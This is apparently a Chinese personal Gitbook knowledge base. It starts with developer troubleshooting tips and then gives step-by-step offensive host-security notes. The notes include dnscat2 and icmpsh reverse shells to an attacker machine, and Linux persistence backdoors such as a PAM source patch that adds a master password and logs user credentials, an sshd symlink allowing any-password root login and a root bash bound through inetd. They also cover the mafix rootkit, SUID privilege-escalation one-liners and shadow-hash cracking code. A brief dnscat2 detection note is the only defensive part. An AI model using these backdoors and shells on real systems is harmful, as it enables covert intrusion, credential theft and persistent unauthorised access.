EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository 解决方案 从官网下载签名并安装 wget archive.kali.org/archive-key.asc apt-key add archive-key.asc gitbook-summary 生成目录，在目录中存在空格无法跳转 由于book命令是新版本，导致无法跳转，因为会将空格转移成%20,在git serve的时候无法将%20解析,不能生成html,所以还是md，生成之后就没有web链接 解决办法： 降级到1.2.2版本 npm install -g gitbook-summary@1.2.2 Vue 打包上线至Nginx # vue-cli npm run build # nginx.conf server { listen 80; server_name localhost; #charset koi8-r; #access_log logs/host.access.log main; location ^~ / { root html/threat/; try_files $uri $uri/ /index.html index index.html index.htm; #index index.html index.htm; } location /api/ { proxy_pass http:///; } ... } Nodejs 连接MySQL8 问题 Error: ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server; consider upgrading MySQL client at Handshake.Sequence._packetToError (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/sequences/Sequence.js:47:14) at Handshake.ErrorPacket (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/sequences/Handshake.js:123:18) at Protocol._parsePacket (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Protocol.js:291:23) at Parser._parsePacket (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Parser.js:433:10) at Parser.write (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Parser.js:43:10) at Protocol.write (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Protocol.js:38:16) at Socket. (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/Connection.js:88:28) at Socket. (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/Connection.js:526:10) at Socket.emit (node:events:527:28) at addChunk (node:internal/streams/readable:315:12) -------------------- at Protocol._enqueue (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Protocol.js:144:48) at Protocol.handshake (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Protocol.js:51:23) at Connection.connect (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/Connection.js:116:18) at Object. (/Users/aaronluo/Desktop/html/node/sql.js:9:5) at Module._compile (node:internal/modules/cjs/loader:1105:14) at Object.Module._extensions..js (node:internal/modules/cjs/loader:1159:10) at Module.load (node:internal/modules/cjs/loader:981:32) at Function.Module._load (node:internal/modules/cjs/loader:822:12) at Module.require (node:internal/modules/cjs/loader:1005:19) at require (node:internal/modules/cjs/helpers:102:18) Emitted 'error' event on Connection instance at: at Connection._handleProtocolError (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/Connection.js:423:8) at Protocol.emit (node:events:527:28) at Protocol._delegateError (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Protocol.js:398:10) at Handshake. (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Protocol.js:153:12) at Handshake.emit (node:events:527:28) at Handshake.Sequence.end (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/sequences/Sequence.js:78:12) at Handshake.ErrorPacket (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/sequences/Handshake.js:125:8) at Protocol._parsePacket (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Protocol.js:291:23) at Parser._parsePacket (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Parser.js:433:10) at Parser.write (/Users/aaronluo/Desktop/html/node/node_modules/mysql/lib/protocol/Parser.js:43:10) { code: 'ER_NOT_SUPPORTED_AUTH_MODE', errno: 1251, sqlMessage: 'Client does not support authentication protocol requested by server; consider upgrading MySQL client', sqlState: '08004', fatal: true } [nodemon] app crashed - waiting for file changes before starting... 导致这个错误的原因是，目前，最新的mysql模块并未完全支持MySQL 8的“caching_sha2_password”加密方式，而“caching_sha2_password”在MySQL 8中是默认的加密方式。因此，下面的方式命令是默认已经使用了“caching_sha2_password”加密方式，该账号、密码无法在mysql模块中使用。 解决方法是重新修改用户root的密码，并指定mysql模块能够支持的加密方式：在mysql内执行下面命令 ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY 'admin'; Javascript removeChild()遍历删除节点之后实际上并没有删除 在for循环的时候一定要倒序删除，才能避免删不干净的情况。浏览器会把空行当做一个子节点，会占一行位置，导致删除失败。 let ol = document.getElementById('ol_id_content') let liArray = ol.childNodes if(liArray.length > 0){ for(let i = liArray.length - 1 ;i > 0; i --){ ol.removeChild(liArray[i]) } }` vue3 编译报 ESLint: ‘defineProps‘ is not defined no-undef 错误问题 在/package.json的eslintConfig.env中加入一行： \"vue/setup-compiler-macros\": true nginx 访问路径末尾带/可以访问，不带则直接重定向到80端口的相对路径 server（或http， location) 节点添加上 absolute_redirect off; Nginx 部署vue项目，需要将项目配置到非根目录(如/admin路径) 首先在vue.config.js中添加 const { defineConfig } = require('@vue/cli-service') module.exports = defineConfig({ publicPath: '/admin/', }) 然后在router/index.js中配置 const router = createRouter({ history: createWebHashHistory(process.env.BASE_URL), base: process.env.BASE_URL, routes }) 打包之后在nginx中配置 location /admin { absolute_redirect off; alias /etc/nginx/html/admin/; try_files $uri $uri/ /admin/index.html; index index.html index.htm; } CentOS 7虚拟机配置静态IP 编辑网卡（其中ens33是我的网卡名称） vim /etc/sysconfig/network-scripts/ifcfg-ens33 BOOTPROTO=\"static\" IPADDR=\"STATIC-IP\" NETMASK=\"NETMASK\" GATEWAY=\"GATEWAY\" systemctl restart network SpringBoot 修改Jar包为War包 添加tomcat依赖以及servlet-api依赖 4.0.0 org.springframework.boot spring-boot-starter-parent 3.2.1 war com.Knownsec KnowledgeSpring 0.0.1-SNAPSHOT KnowledgeSpring KnowledgeSpring 17 org.springframework.boot spring-boot-starter-web org.springframework.boot spring-boot-starter-tomcat javax.servlet javax.servlet-api 3.1.0 provided org.springframework.boot spring-boot-starter-tomcat provided org.mybatis.spring.boot mybatis-spring-boot-starter 3.0.3 org.springframework.boot spring-boot-devtools runtime true org.projectlombok lombok true org.springframework.boot spring-boot-starter-test test org.mybatis.spring.boot mybatis-spring-boot-starter-test 3.0.3 test mysql mysql-connector-java 8.0.33 com.fasterxml.jackson.core jackson-databind 2.15.2 commons-codec commons-codec 1.15 org.springframework.boot spring-boot-maven-plugin org.projectlombok lombok org.apache.maven.plugins maven-war-plugin 3.3.2 false 添加一个SpringBootStartApplication类继承SpringBootServletInitializer package com.knownsec.knowledgespring; import org.springframework.boot.builder.SpringApplicationBuilder; import org.springframework.boot.web.servlet.support.SpringBootServletInitializer; public class SpringBootStartApplication extends SpringBootServletInitializer { @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder applicationBuilder) { return applicationBuilder.sources(KnowledgeSpringApplication.class); } } 25个T及以上的日志怎么阅读？ split -b 100m access.log split命令是一个在Unix、Linux和类Unix操作系统中常见的命令行实用程序，用于将一个大文件分割成多个较小的文件。 split [选项] 文件名 [输出文件名前缀] 常用选项 -b: 按照指定的大小分割文件。可以使用K、M、G等后缀表示文件大小，例如10M表示分割成大小为10MB的文件。 -l: 按照行数分割文件。 -a: 指定生成的文件名后缀的长度，默认为2。 -d: 使用数字作为输出文件名的后缀。 -v: 使用版本号作为输出文件名的后缀。 -t: 在控制台输出分割进度信息。 --help: 显示帮助信息。 -C选项时，split会将输入文件分割成多个输出文件，每个输出文件的大小不超过指定的字节数. Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-07 16:16:45 "},"知识库/03.主机安全/02.计算机从加电到启动系统的过程（Linux）.html":{"url":"知识库/03.主机安全/02.计算机从加电到启动系统的过程（Linux）.html","title":"02.计算机从加电到启动系统的过程（Linux）","keywords":"","body":"简单过程 BIOS启动主动执行的固件，去认识第1个可启动设备 第一个可启动设备的第一个扇区的主引导块MBR，内含启动引导代码 bootloader（启动引导程序），读取内核文件来执行软件 内核文件启动操作系统 从加电到BIOS启动 第一步，加电引导寄存器置位 这个过程指，计算机加电之后，一个特殊电路会在CPU对应的针脚处产生一个逻辑电平，这个电平的值从针脚进入CPU，会引发寄存器（cs,eip）设置成特定值。 第二步，引导BIOS启动 这一过程指的是系统从物理地址0xfffffff0处加载一段程序到只读内存（ROM-> Read Only Memory），这个程序在80x86体系架构中一般称为BIOS 相关知识学习 MS-DOS的很多系统调用依赖BIOS Linux进入保护模式后不再依赖BIOS，BIOS只能以实模式运行。 实模式的寻址是20位总线寻址，支持的寻址空间为2^20，也就是1MB，保护模式目前在x86结构下，支持4GB寻址; 实际区别主要是EIP中的虚地址到实地址转化的区别： 实模式是seg(eip地址)*16+offset(4为偏移量)； 保护模式实EIP的16位地址代表页面位置，一个页在操作系统中都学习过是4KB，1M*4K = 4G，我相信很多人就此理解了为啥页的大小要设计成4K； BIOS引导加载操作系统镜像 第一步，检查硬件 一般可认为是开机加电自检，这个阶段会显示一些信息，包括BIOS版本这一类的信息 第二步，初始化硬件 主要是避免IRQ先与I/O冲突，本阶段最后会显示所有PCI（总线--内部硬件通信线路）设备信息 第三步，搜索操作系统 从软盘、网络、磁盘、CD-ROM的主引导扇区上搜索。找到后加载到扇区的内容到0x00007c00的位置（RAM中），跳转到这个地址，开始执行这段代码，这段程序叫做bootloader。 由于大小限制，linux的启动程序GRUB（GRand Unified BootLoader）或者是LILO（LInux LOader）被分为两部分。 第一部分就是加载到0x00007c00的这一段，他会把自己移动到0x00096a00的位置，建立实模式栈（0x00098000~0x000969ff） 第一部分吧第二部分加载到0x00096c00开始的位置中。 以上的位置都是在RAM中。 第二部分搜索磁盘上的OS景象，，把对应的扇区拷贝到RAM中执行： 1、首先把内核景象的第一个512B的部分从0x00090000处装入RAM中； 2、把setup()函数代码段装入0x00090200位置(RAM); 3、加载其他内核部分从高（0x00100000）或低（0x00010000）两个位置任选其一加载到RAM中，分别称为大映像内核和小映像内核； 4、跳转到setup函数执行； Setup 函数引导内核 这个过程主要是检查和初始化硬件、虽然BIOS完成了相似的大部分工作，但是因为不依赖与BIOS，所以，还是重新初始化了硬件方面的事情；重要的过程有： 移动低装载小映像内核的位置到0x00001000去，如果是高装载则不移动; 建立IDT（临时中断描述符表）和GDT（临时全局描述符表）； 如果需要，重置浮点单元（FPU）； 重新编写可编程终端控制器（PIC），屏蔽除IRQ2外的所有终端； 设置cr0寄存器到PE位，设置PG位为0，切换到保护模式，暂未启用分页； 跳转到startup_32()函数； 内核建立阶段 startup_32()函数 主要做的事如下： 初始化段寄存器和一个临时堆栈，并清零eflags寄存器所有为； 用0填充_edata 和_end符号标识的内核未初始化数据区； 调用decompress_kernel函数解压内核映像；【低装载的情况解压内容放在0x00100000位置开始的RAM中，高装载的放在这后面的一个临时缓冲区内，解压后的内核就被移动到0x00100000位置】 跳转到0x00100000位置开始执行,新的执行点事arch/i386/kernerlhead.s中的另一个startup_32函数。 startup_32()函数 这个函数就是init进程(也就是pid = 0 的 0号进程)，主要做了以下工作 段寄存器初始化为最终值，内核的bss段填写为0； 初始化临时内核页表，初始化pg0，使得线性地址一律映射到统一的物理地址上； cr3寄存器保存了页全局目录，并设置cr0的pg位启用分页； 清零eflags，使用setup_idt函数用空的终端处理程序填充IDT； 从bios获取的数据（系统参数和传递给os的参数）放入页框1； 识别处理器、用GDT和IDT填充gdtr和idtr寄存器； 跳转到start_kernel函数 内核完善阶段start_kernel函数 这一阶段最终完善了内核的初始化的后续工作，启动了程序调度、内存管理等操作系统的功能，其中就涉及到了著名的函数sched_init函数，至此，系统完全启动成功 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-06 13:36:46 "},"知识库/03.主机安全/03.Base64编码解码原理.html":{"url":"知识库/03.主机安全/03.Base64编码解码原理.html","title":"03.Base64编码解码原理","keywords":"","body":"base64 编码是使用64个可打印的字符的ASCII字符（0-9、A-Z、a-z、+、\\）将任意字节序列数据编码成ascii码而成的一种算法，另有“=”符号用作后缀补位 base64 索引表 编码 ASCII码一共有256位(00000000-11111111)，因为1个字节有8bit，所以是8bit表示对应一个ASCII码 base64 编码，一共有64个可见字符，那么用二进制表示0-63，则是0 - (26 -1)=>000000-111111，所以对应的是6bit表示一个base64码 当ascii码转成base64码时，因为8和6的最小公倍数为24，24/8=3，24/6=4，表示每3个ascii码为1组，转换为4个base64码 abc => 01100001 01100010 01100011 011000 010110 001001 100011 => 24、22、9、35 YWJj 编码过程中，如果字符串不是3的倍数，那么就需要补位，就需要在后面添加=,如果8n mod 6 =2 那么需要补两个=，如果8n mod 6 = 4 需要补1个=，如果8n mod 6 = 0 则不需要=, (n为ascii码数量) abcd => 4*8 / 6 = 5 ...... 2 => 8*n mod 6 = 2 => 当余数=2的时候，要正常编码，bit数一定要为24的倍数，32+m = 24*n (n取最小值2) 所以需要补的bit数为48-32=16 => 需要补的16 位当中，已经有2位等待补0，那么按6bit一个base64码，需要补4位0，其余12位就补x（也就是两位=） 01100001 01100010 01100011 01100100 011000 010110 001001 100011 011001 00 0000 xxxxxx xxxxxx =>24、22、9、35、25、0、=、= YWJjZA== => 8n mod 6 = 4 的情况，8n = 16 n=2的时候，需要补2个00,然后再补6位x才满足16+8=24，可以被base64编码 ab => YWI= 所以记住 当8*n mod 6 = 2需要补16个bit，4个bit填充0，12个bit填充x，也就是两个= 8*n mod 6 = 4,需要补8个bit，其中2个bit填充0，6个填充x，也就是1个= mod运算在数论中学过，8n mod 6 这个等式等价于8 mod 6,在ascii 和 base64码相互转换，一定要满足待转换数的bit数为`24n` 解码 相信此时您已经了解了编码过程，那么对于解码来说就很简单了 编码过程中，是将3个字符编码成4个base64码，那么解码过程就是将4个base64码解码成3个ascii码（每8个bit一组，组合成一个ascii码） 对应如下： YWJj 011000 010110 001001 100011 01100001 01100010 01100011 => 97 98 99 abc 那么如果有=的该怎么计算对应的解码后的字符个数呢？ 如YMI=base64 编码的字符个数有4个，那么对应解码的字符个数为3个，又因为=为补位，需要减去，那么公式为n * 6 - 8 * m / 8 => (3 * n / 4)- m(化简后)（其中m为=个数，n 为base64码个数） 例：YWJjZA==解码后字符个数为 3 * 8 / 4 - 2 = 4 YWJjZA== 011000 010110 001001 100011 011001 00 0000 xxxxxx xxxxxx 01100001 01100010 01100011 01100100 (后面的0000 xxxxxx xxxxxx 为补位，在解码过程中需要去掉) => 97 98 99 100 abcd 所以记住，当解码base64码的时候： 当编码有1个= ，减去8个bit，如YMI=,(3 * n / 4) - m = 3*4/4-1 = 2 (n=4,m=1) 当编码有2个= ，减去16个bit，如YWJjZA==,(3*n / 4) -m = 3*8/4-2 = 4(n=8,m=2)参考文档 https://www.cnblogs.com/vege/p/12675562.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-06 13:09:32 "},"知识库/03.主机安全/04.DNS隧道反弹shell.html":{"url":"知识库/03.主机安全/04.DNS隧道反弹shell.html","title":"04.DNS隧道反弹shell","keywords":"","body":"项目地址：https://github.com/iagox86/dnscat2 DNS介绍 DNS是域名系统(Domain Name System)的缩写，是因特网的一项核心服务，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。 DNS的记录类型有很多，有A，AAAA,CNAME,MX,SOA,NS等。 DNS Tunneling可以利用其中的一些记录类型来传输数据。例如A，MX，CNAME,TXT，NULL等。 A记录：A记录是用来指定主机名对应的ip地址记录，简单的说A记录是指定域名对应的IP地址。 AAAA记录：记录将域名解析到一个指定的ipv6的ip上 CNAME记录，别名解析。可以将注册不同的域名解析到一个ip地址。 NS记录：域名服务器记录，用来指定该域名是由哪个DNS服务器进行解析。 MX记录:指向的是一个邮件服务器。 TXT记录：一般是指某个主机名或域名的说明 PTR记录：反向DNS DNS的解析过程可以分为两种类型：迭代查询和递归查询。通常本机到Local DNS Server的过程属于递归查询，而Local DNS Server对查询域名的解析过程属于迭代查询。为了减轻Local DNS Server的压力，提高解析速度，引入了缓存机制。缓存和TTL紧密相连，当TTL过期，Local DNS Server则会丢弃缓存的数据，重新从权威域名服务器上获取新的数据。 本地客户端---->Local DNS server---->根域服务器 Dns解析过程：系统发出dns解析之前会先看看本地是否保存了相关域名的解析，系统检测到hosts文件中没有响应的域名解析的时候会发送给本地dns解析服务器进行解析，解析之前会看看缓存中是否存在，如果没有，再将解析请求发给下一个dns服务器。结果返回后将该域名的解析结果保存到缓存中。 DNSCat2 工具介绍 Dnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道。 Dnscat2分为client端和server端，client运行在被控机器上，server运行在DNS服务器上。client，server部分分别是用C，ruby写的。其中作者在实现client部分时实现了跨平台，支持linux和windows编译运行。在完成连接建立后可以实现建立shell，上传下载文件等功能。 DNSCat2 环境搭建 LInux 客户端搭建 git clone https://github.com/iagox86/dnscat2 cd dnscat2/client/ make Linux 服务端搭建 # 有ruby 环境下 # 无ruby 环境 apt install ruby-full，我的ruby是2.7 cd dnscat2/server gem install bundler apt install ruby-dev bundler install 反弹shell 首先在服务端运行 # root 模式下 cd dnscat2/server ruby dnscat2.rb 然后在服务端banner信息中可以看到，如下所示的命令，在客户端处执行 cd dnscat2/client make ./dnscat --dns server=127.0.0.1,port=53 --secret=c229df179cba2226828cd03ff13859a4 在服务端执行 windows -a 进入会话 window -i 1 退出当前通道，进入shell suspend windows -a window -i 2 错误分析 地址被占用 netstat -ntlp # 关闭之后无法上网，这个是dns解析 systemctl stop systemd-resolved.service 运行服务端之后，一直告知warning: Capturing the given block using Kernel#proc is deprecated; use&blockinstead # 将错误重定向到指定文件即可 ruby dnscat2.rb 2> error 流量检测 在使用dnscat2 利用dns隧道进行反弹shell，那么作为防守方该如何检测呢？ 特征dnscat 首先在客户端处，会向恶意服务端发送dns请求，且会一直发送，包里都有相同的特征dnscat 域名特征 其次可以看到解析的域名很长，不符合正常域名 对比正常dns 解析流量包 正常dns域名解析包如下，通过对比可以发现dnscat2 的特征是非常明显的，正常包是不会有加密 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:55:36 "},"知识库/03.主机安全/05.ICMP隧道反弹shell.html":{"url":"知识库/03.主机安全/05.ICMP隧道反弹shell.html","title":"05.ICMP隧道反弹shell","keywords":"","body":"项目地址：https://github.com/bdamele/icmpsh 背景 很多时候网络运维人员只会允许流量进入已知主机，端口和服务（在入口处过滤），当身处DMZ区域，通过TCP获取反向shell是不可能的，但是如果使用UDP（DNS隧道）或者icmp那么还是可以尝试 ICMPSH icmpsh是由python2 编写的，Linux 默认自带python2，但是无pip2，下载pip2()，然后下载项目(git clone ) // 下载pip2 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py // 安装pip2，默认python 版本是python2 python get-pip.py // 下载项目 git clone https://github.com/bdamele/icmpsh 使用方法 条件 攻击机关闭icmp回应包 受害机能发送icmp包到攻击机 pip install impacket -i https://pypi.douban.com/simple // 首先在攻击机上关闭icmp回显 sysctl -w net.ipv4.icmp_echo_ignore_all=1 // 其次，192.168.93.131是攻击机 python icmpsh_m.py 192.168.93.131 192.168.93.134 // 最后，在受害机执行 icmpsh.exe -t 192.168.93.131 两个问题 当前演示的环境是windows，那么受害机是Linux如何getshell ？ Linux 主机暂时未找到解决办法。。 为什么使用虚拟机（NAT模式下），主机作为受害者却始终不能getshell ？ 因为NAT模式是交换机NAT，从宿主机走出来的流量要先经过192.168.93.1 然后才能走到192.168.93.131(攻击机)，所以我们需要监听的是交换机的地址 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 18:06:12 "},"知识库/03.主机安全/06.Linux权限维持.html":{"url":"知识库/03.主机安全/06.Linux权限维持.html","title":"06.Linux权限维持","keywords":"","body":"背景 在拿到一台主机（Linux）的普通权限，或最高权限（uid=0），则要开始进行后渗透阶段，如果当Session断掉之后，能够迅速上线该主机，那么就需要维持该Session的权限了 计划任务(Crontab) Linux 中同步计划任务有如下： 系统级别的计划任务 /etc/crontab /etc/cron.*/ 用户级别的计划任务 /var/spool/corn/* 相对应的语法如下所示（这里以系统级别的计划任务举例） minute hour day month day of week user-name command to be executed 优点 缺点 无需编译，配置简单 易排查，设备上容易产生告警 Authorized key 持久化 攻击者在本地生成公私钥对 # 输入以下命令会在~/.ssh/目录下创建两个文件，分别是id_rsa,id_rsa.pub ssh-keygen -b 4096 -t rsa 在受害机已经获取权限的用户目录下执行 vi ~/.ssh/authorized_keys # 将刚刚生成的id_rsa.pub内容粘贴到authorized_keys文件中，如果该文件原来存在内容，就另起一行 chmod 600 ~/.ssh/authorized_keys chmod 700 ~/.ssh 使用自己的私钥登录该系统 如果只有一对公私钥可以不用指定私钥，ssh客户端在登录的时候会寻找/.ssh/id_rsa 优点 缺点 利用简单，攻击行为接近正常登录，一般不会触发告警 容易排查 Open SSH 后门 # 下载openssh-5.9p1.tar.gz openssh-5.9p1.patch.tar.gz tar zxf openssh-5.9p1.tar.gz tar zxf openssh-5.9p1.patch.tar.gz cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1 patch 修改include.h，默认将ssh登录该服务器的密码存储在/tmp/ilog 和 该服务器登录远程服务器的明文密码存储在/tmp/olog，SECRETPW 为 在受害机ssh登录服务器 使用apaajaboleh登录 优点 缺点 隐蔽性较强，攻击行为接近正常登录，不易触发其他告警。 需要编译环境，缺少GCC或其他依赖包容易出现问题，相对容易排查 SSH PAM 后门 PAM 是 Linux 默认的 SSH 认证登录机制，可以通过修改源码实现万能密码，记录登录密码等功能 # 首先查看PAM版本，需要有gcc编译环境 rpm -qa | grep pam tar zxvf Linux-PAM-1.1.8.tar.gz cd Linux-PAM-1.1.8 # 修改源码 vim modules/pam_unix/pam_unix_auth.c # 添加代码 if(strcmp(\"PAM\",p)==0){return PAM_SUCCESS;} if(retval == PAM_SUCCESS){ FILE * fp; fp = fopen(\"/tmp/.sshlog\", \"a\"); fprintf(fp, \"%s : %s\\n\", name, p); fclose(fp); } # 预编译 ./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr # 编译，编译前可能会报错需要安装flex 和 flex-devel yum install flex flex-devel -y make 预编译 编译 # 编译完成之后，动态链接库在Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so # 查找系统原so文件默认存储在/usr/lib64/security/pam_unix.so find / -name pam_unix.so # 备份原pam文件和替换恶意pam文件 mv /usr/lib64/security/pam_unix.so /usr/lib64/security/pam_unix.so.bak mv /home/aaron/Desktop/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so 使用正常密码登录，可以在/tmp/.sshlog文件找到登录密码，使用我们留的密码（PAM）登录也可以 优点 缺点 攻击行为接近正常登录，不会触发其他告警 容易排查，需要编译环境 SSH 软连接 后门 # 通过软连接建立一个ssh后门 ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345 原理： Linux软连接ssh后门，通过PAM认证方式登录 将sshd文件软连接名称设置为su ,实质上PAM认证是通过软连接的文件名(如:/usr/local/su)在/etc/pam.d/目录下寻找对应的PAM配置文件(如:/etc/pam.d/su) 任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆 建立软连接到/usr/local/su 文件，也可以在其他目录，su文件名字不能变，变了就无法登录。当然可以通过其他设置，更改su名字也是可以的。然后启动，并指定监听12345端口，登录的时候密码随意即可，登录如下： 使用root/任意密码即可登录成功 优点 缺点 攻击行为接近正常登录，不会触发其他告警 容易被排查 Vim 后门 修改/etc/vimrc 或者/etc/.vimrc，每次启动vim 执行恶意脚本，vim 支持python，构建python 反弹shell vim /etc/vimrc 优点 缺点 利用简单 持久化效果一般，易暴露 alias 后门 alias 是Linux的命令的别名，存储在~/.bashrc(这里只讨论bash shell)中，修改之后再使用命令，当再使用ls时，就会反弹shell source ~/.bashrc 优点 缺点 利用简单 容易被发现，持久化效果一般 inetd 后门 通俗来讲就是一个监听外部网络请求 [就是一个socket] 的系统守护进程,其实有很多比较古老的服务都是基于此守护进程 # 安装inetd apt install openbsd-inetd # 可以直接用service中定义好的服务，只需要把实际的处理程序替换下即可 vim /etc/services fido 60179/tcp # fidonet EMSI over TCP # 配置inetd.conf 并启动inetd vim /etc/inetd.conf fido stream tcp nowait root /bin/bash -i # 当外部请求为fido的服务时，就反弹一个交互式的shell systemctl restart inetd nc -vv [host] [port] 优点 缺点 利用简单 有反连shell告警 mafix 后门 下载地址：https://github.com/yzimhao/godpock/tree/master/Rootkit tar zxvf mafix.tar.gz cd mafix.tar.gz ./root 密码 端口 # 攻击机 使用如下命令 # centos 7 还支持ssh1，windows，Debian、Ubuntu ssh客户端不支持ssh1 ssh -1 root@xxx.xxx.xxx.xxx -p port 优点 缺点 无需编译，配置简单 会替换ls等命令，容易被识破 环境依赖较高，在Ubuntu，centos上测试不通过，Ubuntu缺少依赖，centos会死机，在Debian上顺利通过 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:27:25 "},"知识库/03.主机安全/07.Linux_SUID提权原理.html":{"url":"知识库/03.主机安全/07.Linux_SUID提权原理.html","title":"07.Linux_SUID提权原理","keywords":"","body":"基本原理 chmod命令可以改变文件或者路径的一些权限属性。在chmod的众多参数中，有一个s参数引发了一个重大的问题。s参数的含义是允许程序临时以所有者权限运行。其使用命令如下： #chmod +s targetfile chmod +s ./exp 原理验证 编写如下代码 persist.c #include #include #include int main(){ setuid(0); system(\"cat /etc/shadow\") return 0; } 在root权限下编译 gcc persist.c -o persist 在普通用户权限下执行 在root用户下添加s权限，并在普通用户下执行 实战利用 可常用命令如下 nmap --interactive \\ !sh find . -type f -exec /bin/bash ; awk 'BEGIN {system(\"/bin/bash\")}' strace -o/dev/null /bin/bash 寻找本机器环境下的s属性程序 find / -perm -u=s -type f 2>/dev/null 使用find提权 问题思考 在这里很疑惑两点 bash shell 不是以root启动 find 提权使用bash shell 命令是以root 启动，但是给的bash shell 启动权限是低权限用户 使用root启动python，但是用户还是低权限用户 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-25 10:36:07 "},"知识库/03.主机安全/08.Linux的账号口令机制及其爆破.html":{"url":"知识库/03.主机安全/08.Linux的账号口令机制及其爆破.html","title":"08.Linux的账号口令机制及其爆破","keywords":"","body":"账号保存 谈到linux的账号认证，其实就是如何保存于通过口令(password)鉴别，这里首先要讲两个文件，一个是/etc/passwd，另外一个是/etc/shadow文件 我们先来看/etc/passwd 文件 /ect/passwd 我们来解释一下这张图片，说明一下/etc/passwd文件的格式：用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell，我们来说几个重点字段 口令： 因为安全问题，放在/etc/shadow中去了 用户标识号：uid 组标识号：gid 主目录：用户主目录 登录shell：当为nologin的时候其实是无法登录的 /ect/shadow 我们来解释一下这张图片，说明一下/etc/shadow文件的格式：用户名:$加密方式$盐字符串$密文口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志，我们来说几个重点字段。 加密方式：6->sha-512加密，1->md5加密，2->Blowfish加密，5->sha-256加密 盐：加盐对抗破解的那个随机字符串 密文口令：和盐一起经过f(password,key)运算后得到的值 认证流程 linxu引导启动后，会读取前文介绍的两个文件，读取到内存中，存入两个数据结构中（passwd结构和spwd结构），使用linux自身的函数获取用户名和密码，对密码进行运算后进行比较。从数学公式来讲，如下： value = f(InputPasswd,SaltString) 然后比较这个value的值与/etc/shadow中的值保存的是否一致。 破解方式 原理介绍 #include #include #include #include const char *value = \"\";//这里是/etc/shadow中的hash值 const char *password = \"\";//明文密码 const char *salt = \"\"; int main(){ if (strcmp(value,crypt(password,salt)) == 0){//salt是盐的字符串 printf(\"[*]Shadow-Hash-Value: %s\\n\",value); printf(\"[*]Count-Hash-Value: %s\\n\",crypt(password,salt)); printf(\"[*]Find-Password:%s\\n\", password); } return 0; } Test # gcc a.c -lcrypt -o a #include #include #include #include const char *value = \"$6$Z0f28R2x$SkbWn/jFsxjQhHIijkLq6o1xIcvktjwABR5Gtfmx8L7zv******************.\";//这里是/etc/shadow中的hash值 const char *password = \"xx\";//明文密码 const char *salt = \"$6$Z0f28R2x$\"; int main(){ if (strcmp(value,crypt(password,salt)) == 0){//salt是盐的字符串 printf(\"[*]Shadow-Hash-Value: %s\\n\",value); printf(\"[*]Count-Hash-Value: %s\\n\",crypt(password,salt)); printf(\"[*]Find-Password:%s\\n\", password); } return 0; } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:56:09 "},"知识库/03.主机安全/09.SSH建立隧道以及转发.html":{"url":"知识库/03.主机安全/09.SSH建立隧道以及转发.html","title":"09.SSH建立隧道以及转发","keywords":"","body":"背景 说到ssh，没有和服务器打交道的人，都只知道ssh是用于远程连接服务器的一个协议吧，我在这里再粘贴一下百度百科： SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH 这篇文章主要是来聊聊ssh隧道及转发 实际问题 事情的起因是因为在做LVS架构加固时，内网某机器需要反向代理另一台公网机器的web服务，该web服务不对外开放，只能本地访问，用户只需要访问内网的web服务，然后建立隧道，从而达到访问外网web服务。 SSH 先抛开上述问题，我们来聊聊ssh ssh 用于登录远程主机, 并且在远程主机上执行命令. 它的目的是替换 rlogin和rsh, 同时在不安全的网络之上, 两个互不信任的主机之间, 提供加密的, 